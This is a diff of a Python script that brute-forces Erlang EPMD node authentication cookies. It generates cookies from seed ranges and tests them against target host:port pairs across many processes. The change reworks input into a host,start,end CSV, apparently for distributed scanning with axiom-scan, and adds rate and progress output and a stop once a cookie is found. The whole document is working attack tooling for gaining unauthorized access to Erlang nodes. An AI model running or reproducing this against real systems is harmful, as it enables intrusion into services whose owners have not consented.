@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 import argparse
 import multiprocessing
-from sys import stderr
+from sys import stderr, exit
+from socket import gethostname
 from os import cpu_count
 from os.path import isfile
-from time import time
+from time import time, sleep
 from multiprocessing import Pool
 from itertools import product
 from ERLPopper import *
@@ -30,58 +31,64 @@ def parse_str_or_file(in_str):
 
     return list_lines
 
-def print_result(res):
-    for r in res:
-        if r is not None:
-            (target, cookie) = res
-            print(f"[+] Good cookie ({target}): {cookie}")
-    #return res
-
 def split(a, n):
     # From: https://stackoverflow.com/questions/2130016/splitting-a-list-into-n-parts-of-approximately-equal-length
     k, m = divmod(len(a), n)
     return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))
 
-def go(target, interval, version, verbose):
-    (start, end) = interval.split(',')
+def go(args):
+    # Unpack args
+    (target, interval, version, verbose) = args
+
+    # Unpack interval
+    (start, end) = (int(i) for i in interval)
+
     interval_time_last = time()
-    interval_progress = int(start)
     r = 0
     old_r = 0
+    prog = start
+
     epop = ERLPopper(target=target, cookie=None, version=version, verbose=verbose)
-    for i in range(int(start), int(end)):
+    for i in range(start, end):
+        if found.is_set():
+            return None
+
+        # Only update every 2 seconds so we're not always waiting for locks
+        #  But the call to time() takes time and you're doing it every... time.
+        #  Is it faster to wait for locks or to call time() and do that math?
         if time() - interval_time_last > 2:
             old_r = r
-            r = int((i-interval_progress)/2)
+            r = int((i - prog)/2)
             with rate.get_lock():
                 rate.value -= old_r
                 rate.value += r
-            print(f"\tCookies: {rate.value}/s{' '*10}", end='\r')
-            interval_progress = i
+            with interval_progress.get_lock():
+                interval_progress.value += r
+            prog = i
             interval_time_last = time()
+            
         cookie = ERLPopper.create_cookie_from_seed(i)
         if epop.check_cookie(cookie):
-            with rate.get_lock():
-                rate.value -= old_r
-            return (target, cookie)
+            return cookie
     
     with rate.get_lock():
         rate.value -= old_r
+    
+    return None
 
 if __name__ == "__main__":
     # Parse args
     parser = argparse.ArgumentParser(
-            description="Attempt to brute force EPMD node cookie using various methods.",
-            epilog="Maximum interval seed space is 0 to 68719476735 according to erl-matter/bruteforce-erldp.c. That's 68.7 billion seeds * 21char = 1.44 TB if you were trying to store the cookies themselves. The entire [A-Z]{20} set is 26^20 * 21char = 4.19 * 10^29 bytes (419.5 billion Exabytes)."
+            description="Attempt to brute force EPMD node cookie given CSV file consisting of <host:port>,<start>,<end>. This was primarily written for ease of use by axiom-scan."
     )
 
-    parser.add_argument("target", action="store", type=parse_str_or_file, help="Target node <address>:<port>, or file containing newline-delimited list of <address>:<port> strings.")
-    parser.add_argument("interval", action="store", type=parse_str_or_file, help="Seed interval in format <start>,<end> or file containing newline-delimited list of intervals.")
+    parser.add_argument("target_and_interval", action="store", type=parse_str_or_file, help="Target node and interval <host:port>,<start>,<end> or file containing newline-delimited list of <host:port>,<start>,<end> strings.")
     version_group = parser.add_mutually_exclusive_group()
     version_group.add_argument("--old", action="store_true", help="Use old handshake method (default).")
     version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
-    parser.add_argument("--verbose", action="store_true", help="Extra output for debugging.")
-    parser.add_argument("--processes", action="store", type=int, help="Number of processes to use (default: 4).")
+    parser.add_argument("--verbose", action="store_true", help="Extra output for debugging (n processes all spitting out verbose output... be smart).")
+    parser.add_argument("--show_rate", action="store_true", default=True, help="Tell worker process whether it should print its cookies/sec rate.")
+    parser.add_argument("--processes", action="store", type=int, help="Number of processes to use (default: return value of os.cpu_count()).")
 
     args = parser.parse_args()
 
@@ -91,24 +98,50 @@ if __name__ == "__main__":
 
     # Make rate variable available to all processes
     rate = multiprocessing.Value('I')
+    interval_progress = multiprocessing.Value('I')
     
-    processes = args.processes
-    if not processes:
-        processes = cpu_count()
+    num_processes = args.processes
+    if not num_processes:
+        num_processes = cpu_count()
 
-    # Divide single interval among n processes
-    if len(args.interval) == 1:
-        (start, end) = args.interval[0].split(',')
-        intervals = [f"{x.start},{x.stop}" for x in split(range(int(start), int(end)), processes)]
-    else:
-        intervals = args.interval
+    if num_processes < 3:
+        print("[E] Number of processes should be 3 or greater (try --processes 64).")
+        exit(-1)
 
-    # Create a product of the passed in arguments which will get map()ed as iterables to pool processes
-    targets_intervals_product = product(args.target, intervals, [version], [args.verbose])
+    # Work through one target/interval at a time
+    #  Not using _async calls, otherwise you'll have num_processes * len(target_and_interval) processes
+    for ti in args.target_and_interval:
+        hostname = gethostname()
+        (target, _) = ti.split(',', 1)
+        (start, end) = (int(i) for i in _.split(','))
+        num_seeds = end - start
 
-    print(f"Dividing {len(args.interval)} intervals among {processes} processes...")
-    with Pool(processes=args.processes) as pool:
-        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result).get()
+        print(f"Dividing {num_seeds} seeds ({start},{end}) among {num_processes} processes...")
+        intervals = [(x.start, x.stop) for x in split(range(start, end), num_processes)]
 
-    print()
-    [print(r) for r in result if r]
+        rate = multiprocessing.Value('I')
+        interval_progress = multiprocessing.Value('I')
+        found = multiprocessing.Event()
+
+        with Pool(processes=num_processes) as pool:
+            targets_intervals_product = product([target], intervals, [version], [args.verbose])
+
+            imap_it = pool.imap(func=go, iterable=targets_intervals_product)
+
+            last_update_time = time()
+            while 1:
+                if time() - last_update_time > 2:
+                    print(f"[*] Host: {hostname}\tRate: {rate.value}/s\tProgress: {interval_progress.value}/{(end-start)} ({(interval_progress.value/(end-start))*100:.2f}%)", file=stderr)
+                    last_update_time = time()
+                try:
+                    # Try to get result or timeout after 0.02s
+                    r = imap_it.next(0.02)
+                    if r:
+                        print(f"[+] Host '{hostname}' found cookie '{r}' for target '{target}'!")
+                        break
+                except StopIteration:
+                    break
+                except multiprocessing.TimeoutError:
+                    continue
+        
+            found.set()
